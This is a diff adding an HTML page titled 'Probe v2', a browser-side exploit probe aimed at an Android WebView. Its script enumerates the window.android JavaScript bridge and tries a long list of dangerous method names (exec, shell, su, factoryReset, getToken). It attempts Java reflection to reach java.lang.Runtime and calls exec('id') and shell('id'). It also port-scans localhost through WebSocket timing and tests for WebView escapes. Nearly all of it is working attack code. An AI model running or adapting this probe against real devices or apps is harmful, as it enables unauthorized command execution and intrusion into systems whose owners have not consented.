@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Probe v2</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 8px; font-size: 11px; overflow-y: auto; }
+h2 { color: #0ff; margin: 4px 0 2px; font-size: 13px; }
+.hit { color: #f00; font-weight: bold; }
+.miss { color: #555; }
+.info { color: #ff0; }
+.test { color: #888; }
+#log { white-space: pre-wrap; word-break: break-all; }
+</style>
+</head>
+<body>
+<h2>Probe v2 - Deep Bridge + Port Scan</h2>
+<div id="status" class="test">Running...</div>
+<div id="log"></div>
+
+<script>
+var L = document.getElementById('log');
+function log(cls, msg) {
+    var d = document.createElement('div');
+    d.className = cls;
+    d.textContent = msg;
+    L.appendChild(d);
+}
+
+log('info', '=== window.android Deep Inspection ===');
+var a = window.android;
+if (a) {
+    log('hit', 'typeof: ' + typeof a);
+    log('hit', 'toString: ' + String(a));
+    try { log('hit', 'JSON: ' + JSON.stringify(a)); } catch(e) { log('info', 'JSON failed: ' + e.message); }
+    try { log('hit', 'valueOf: ' + String(a.valueOf())); } catch(e) {}
+    try { log('hit', 'constructor: ' + String(a.constructor)); } catch(e) {}
+    try { log('hit', 'constructor.name: ' + a.constructor.name); } catch(e) {}
+    try { log('hit', '__proto__: ' + String(Object.getPrototypeOf(a))); } catch(e) {}
+
+    try {
+        var own = Object.getOwnPropertyNames(a);
+        log('hit', 'OwnPropertyNames (' + own.length + '): ' + own.join(', '));
+    } catch(e) { log('info', 'getOwnPropertyNames failed: ' + e.message); }
+
+    try {
+        var k = Object.keys(a);
+        log('hit', 'keys (' + k.length + '): ' + k.join(', '));
+    } catch(e) {}
+
+    log('info', '--- for..in enumeration ---');
+    var allKeys = [];
+    try {
+        for (var key in a) { allKeys.push(key); }
+        log('hit', 'for..in keys (' + allKeys.length + '): ' + allKeys.join(', '));
+    } catch(e) { log('info', 'for..in failed: ' + e.message); }
+
+    log('info', '--- Prototype chain ---');
+    try {
+        var proto = Object.getPrototypeOf(a);
+        var depth = 0;
+        while (proto && depth < 5) {
+            var pkeys = Object.getOwnPropertyNames(proto);
+            log('hit', 'Proto[' + depth + '] (' + pkeys.length + '): ' + pkeys.join(', '));
+            proto = Object.getPrototypeOf(proto);
+            depth++;
+        }
+    } catch(e) { log('info', 'Proto walk failed: ' + e.message); }
+
+    log('info', '--- Common bridge methods ---');
+    var methods = [
+        'exec','execute','runCommand','run','shell','cmd',
+        'startActivity','startService','sendBroadcast',
+        'getSystemProperty','getProperty','getProp',
+        'setSystemProperty','setProperty','setProp',
+        'install','installPackage','uninstall',
+        'enableAdb','enableUsb','enableDebug','setDebug',
+        'getDeviceId','getSerial','getIMEI',
+        'getBuildProp','getVersion','getModel',
+        'openSettings','openUrl','loadUrl',
+        'readFile','writeFile','deleteFile',
+        'listDir','listFiles','ls',
+        'reboot','shutdown','factoryReset',
+        'getWifiInfo','getNetworkInfo','getIpAddress',
+        'toast','showToast',
+        'evaluateJavascript','callNative','nativeCall',
+        'postMessage','sendMessage','onMessage',
+        'getToken','getAccessToken','getCookie',
+        'launchApp','openApp','startApp',
+        'getPackages','getInstalledApps','listApps',
+        'su','sudo','root','elevate',
+        'mount','remount','chmod','chown',
+        'downloadFile','download',
+        'playAudio','stopAudio','setVolume','getVolume',
+        'takeScreenshot','captureScreen',
+        'getClipboard','setClipboard',
+        'getBattery','getBatteryLevel',
+        'getMemoryInfo','getCpuInfo','getDiskSpace',
+        'isRooted','checkRoot','hasRoot',
+        'enableDeveloperMode','enableDevOptions',
+        'setAdbEnabled','isAdbEnabled',
+        'getContentResolver','query','insert','update','delete',
+        'getSharedPreferences','getPreference',
+        'log','debug','info','warn','error',
+        'onReady','init','initialize','setup',
+        'close','exit','finish','destroy',
+        'back','home','recents',
+        'dispatchKeyEvent','sendKeyEvent','injectInput',
+        'getContext','getActivity','getApplication',
+        'requestPermission','checkPermission','hasPermission',
+        'getClass','forName','invoke','newInstance',
+        'notify','notifyAll','wait',
+        'hashCode','equals','toString',
+    ];
+
+    for (var i = 0; i < methods.length; i++) {
+        try {
+            var val = a[methods[i]];
+            if (val !== undefined && val !== null) {
+                log('hit', '  .' + methods[i] + ' = ' + typeof val + ': ' + String(val).substring(0, 150));
+            }
+        } catch(e) {
+            log('hit', '  .' + methods[i] + ' ACCESS ERROR: ' + e.message);
+        }
+    }
+
+    log('info', '--- Java Reflection ---');
+    try {
+        var cls = a.getClass();
+        log('hit', 'getClass() returned: ' + String(cls));
+        try { log('hit', '  getName: ' + cls.getName()); } catch(e) {}
+        try { log('hit', '  getSimpleName: ' + cls.getSimpleName()); } catch(e) {}
+        try {
+            var meths = cls.getMethods();
+            log('hit', '  getMethods count: ' + meths.length);
+            for (var m = 0; m < Math.min(meths.length, 50); m++) {
+                log('hit', '    ' + meths[m].getName() + '(' + meths[m].getParameterTypes().length + ' params)');
+            }
+        } catch(e) { log('info', '  getMethods failed: ' + e.message); }
+        try {
+            var runtime = cls.forName('java.lang.Runtime');
+            log('hit', 'GOT Runtime class: ' + String(runtime));
+            var rt = runtime.getMethod('getRuntime', null).invoke(null, null);
+            log('hit', 'GOT Runtime instance: ' + String(rt));
+        } catch(e) { log('info', '  Runtime reflection: ' + e.message); }
+    } catch(e) { log('info', 'getClass failed: ' + e.message); }
+
+    log('info', '--- Direct calls ---');
+    var tryCalls = [
+        ['toString',[]],['getDeviceId',[]],['getSerial',[]],['getModel',[]],
+        ['getVersion',[]],['getBuildProp',['ro.build.display.id']],
+        ['getSystemProperty',['ro.build.display.id']],['getProp',['ro.build.display.id']],
+        ['isAdbEnabled',[]],['isRooted',[]],['getInstalledApps',[]],
+        ['exec',['id']],['shell',['id']],['run',['id']],['runCommand',['id']],
+    ];
+    for (var i = 0; i < tryCalls.length; i++) {
+        try {
+            var fn = a[tryCalls[i][0]];
+            if (typeof fn === 'function') {
+                var result = fn.apply(a, tryCalls[i][1]);
+                log('hit', 'CALL ' + tryCalls[i][0] + '(' + tryCalls[i][1].join(',') + ') = ' + String(result).substring(0, 300));
+            }
+        } catch(e) {
+            if (typeof a[tryCalls[i][0]] === 'function') {
+                log('info', 'CALL ' + tryCalls[i][0] + ' threw: ' + e.message);
+            }
+        }
+    }
+} else {
+    log('miss', 'window.android not found');
+}
+
+log('info', '=== Port 5541 Deep Probe ===');
+
+async function probePort5541() {
+    var endpoints = [
+        'http://127.0.0.1:5541/','http://127.0.0.1:5541/status',
+        'http://127.0.0.1:5541/api','http://127.0.0.1:5541/info',
+        'http://127.0.0.1:5541/version','http://127.0.0.1:5541/json/version',
+        'http://localhost:5541/',
+    ];
+    for (var i = 0; i < endpoints.length; i++) {
+        try {
+            var resp = await fetch(endpoints[i], {mode:'no-cors'});
+            log('hit', '[5541] ' + endpoints[i] + ' status=' + resp.status + ' type=' + resp.type);
+            try { var text = await resp.text(); if (text) log('hit', '  Body: ' + text.substring(0, 500)); } catch(e) {}
+        } catch(e) {
+            log('miss', '[5541] ' + endpoints[i] + ': ' + e.message.substring(0, 80));
+        }
+    }
+
+    log('info', '--- WS on 5541 ---');
+    try {
+        var ws = new WebSocket('ws://127.0.0.1:5541/');
+        ws.onopen = function() { log('hit', '[WS 5541] CONNECTED!'); ws.send('{"cmd":"status"}'); };
+        ws.onmessage = function(e) { log('hit', '[WS 5541] MSG: ' + String(e.data).substring(0, 500)); };
+        ws.onerror = function() { log('miss', '[WS 5541] error'); };
+        ws.onclose = function(e) { log('info', '[WS 5541] closed code=' + e.code); };
+    } catch(e) { log('miss', '[WS 5541] ' + e.message); }
+
+    log('info', '--- Nearby ports 5530-5560 ---');
+    for (var p = 5530; p <= 5560; p++) {
+        var start = performance.now();
+        try {
+            var ws2 = new WebSocket('ws://127.0.0.1:' + p + '/');
+            await new Promise(function(resolve) {
+                var done = false;
+                ws2.onopen = function() { if (!done) { done=true; log('hit', 'PORT ' + p + ': OPEN'); ws2.close(); resolve(); } };
+                ws2.onerror = function() { if (!done) { done=true; var ms=Math.round(performance.now()-start); log(ms>50?'hit':'miss', 'PORT ' + p + ': ' + ms + 'ms'); resolve(); } };
+                ws2.onclose = function() { if (!done) { done=true; resolve(); } };
+                setTimeout(function() { if (!done) { done=true; resolve(); } }, 1000);
+            });
+        } catch(e) {}
+    }
+}
+
+async function widerScan() {
+    log('info', '=== Wider Port Scan ===');
+    var ports = [
+        [21,'FTP'],[22,'SSH'],[23,'Telnet'],[80,'HTTP'],[443,'HTTPS'],
+        [445,'SMB'],[554,'RTSP'],[1883,'MQTT'],[2222,'SSH-alt'],
+        [3000,'Node'],[4000,'x'],[5000,'Flask'],[5353,'mDNS'],
+        [5500,'VNC'],[5900,'VNC'],[7070,'x'],[8000,'HTTP'],
+        [8008,'HTTP2'],[8081,'x'],[8443,'HTTPS'],[8554,'RTSP'],
+        [8888,'x'],[9000,'x'],[9090,'x'],[10000,'x'],
+        [49152,'UPnP'],[49153,'UPnP'],[55443,'Alexa'],[55555,'x'],
+    ];
+    var baseline = [];
+    for (var b of [2000,2001,6666]) {
+        var s = performance.now();
+        await new Promise(function(resolve) {
+            var ws = new WebSocket('ws://127.0.0.1:' + b + '/');
+            var d = false;
+            ws.onerror = function() { if(!d){d=true; baseline.push(performance.now()-s); resolve();} };
+            ws.onclose = function() { if(!d){d=true; resolve();} };
+            setTimeout(function(){ if(!d){d=true; baseline.push(500); resolve();}}, 500);
+        });
+    }
+    var avg = baseline.reduce(function(a,b){return a+b;},0)/baseline.length;
+    log('info', 'Baseline: ' + Math.round(avg) + 'ms');
+    for (var i = 0; i < ports.length; i++) {
+        var port = ports[i][0], label = ports[i][1];
+        var start = performance.now();
+        await new Promise(function(resolve) {
+            var done = false;
+            var ws = new WebSocket('ws://127.0.0.1:' + port + '/');
+            ws.onopen = function() { if(!done){done=true; log('hit', 'OPEN ' + port + ' (' + label + ')'); ws.close(); resolve();} };
+            ws.onerror = function() { if(!done){done=true; var ms=Math.round(performance.now()-start); var diff=ms-avg; if(Math.abs(diff)>50||ms>100) log('hit', 'DIFF ' + port + ' (' + label + '): ' + ms + 'ms d:' + Math.round(diff)); resolve();} };
+            ws.onclose = function() { if(!done){done=true; resolve();} };
+            setTimeout(function(){ if(!done){done=true; resolve();}}, 1500);
+        });
+    }
+}
+
+async function webviewEscapes() {
+    log('info', '=== WebView Escapes ===');
+    try {
+        var w = window.open('about:blank');
+        if (w) { log('hit', 'window.open worked!'); try{w.close();}catch(e){} }
+        else log('miss', 'window.open null');
+    } catch(e) { log('miss', 'window.open: ' + e.message); }
+
+    try {
+        if (navigator.serviceWorker) { log('hit', 'serviceWorker available'); }
+        else log('miss', 'No serviceWorker');
+    } catch(e) {}
+
+    try {
+        if (window.showDirectoryPicker) log('hit', 'showDirectoryPicker available');
+        if (window.showOpenFilePicker) log('hit', 'showOpenFilePicker available');
+        if (window.showSaveFilePicker) log('hit', 'showSaveFilePicker available');
+    } catch(e) {}
+
+    log('info', '--- Navigator ---');
+    var navProps = ['platform','product','appVersion','vendor','hardwareConcurrency',
+        'deviceMemory','maxTouchPoints','languages','connection','permissions',
+        'mediaDevices','usb','bluetooth','serial','hid','nfc'];
+    for (var np of navProps) {
+        try {
+            var v = navigator[np];
+            if (v !== undefined && v !== null) {
+                if (typeof v === 'object') {
+                    log('info', 'nav.' + np + ' = {' + Object.getOwnPropertyNames(v).slice(0,10).join(', ') + '}');
+                } else {
+                    log('info', 'nav.' + np + ' = ' + String(v));
+                }
+            }
+        } catch(e) {}
+    }
+}
+
+async function runAll() {
+    await probePort5541();
+    await widerScan();
+    await webviewEscapes();
+    document.getElementById('status').textContent = 'DONE';
+    document.getElementById('status').className = 'hit';
+    log('info', '=== PROBE v2 COMPLETE ===');
+}
+runAll();
+</script>
+</body>
+</html>
